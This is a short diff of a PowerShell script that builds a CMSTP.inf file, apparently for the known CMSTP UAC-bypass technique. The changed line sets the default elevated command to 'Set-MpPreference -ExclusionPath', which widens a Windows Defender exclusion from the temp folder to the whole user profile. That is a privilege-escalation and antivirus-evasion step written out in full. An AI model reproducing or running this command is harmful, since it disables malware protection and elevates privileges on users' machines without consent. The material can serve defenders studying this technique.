@@ -5,7 +5,7 @@ Function script:Set-INFFile {
 	$InfFileLocation = "$env:temp\CMSTP.inf",
 	
 	[Parameter(HelpMessage="Specify the command to launch in a UAC-privileged window")]
-	[String]$CommandToExecute = 'cmd.exe /c powershell.exe Set-MpPreference -ExclusionPath $env:TEMP'
+	[String]$CommandToExecute = 'cmd.exe /c powershell.exe Set-MpPreference -ExclusionPath $env:USERPROFILE'
 	)
 
 $InfContent = @"
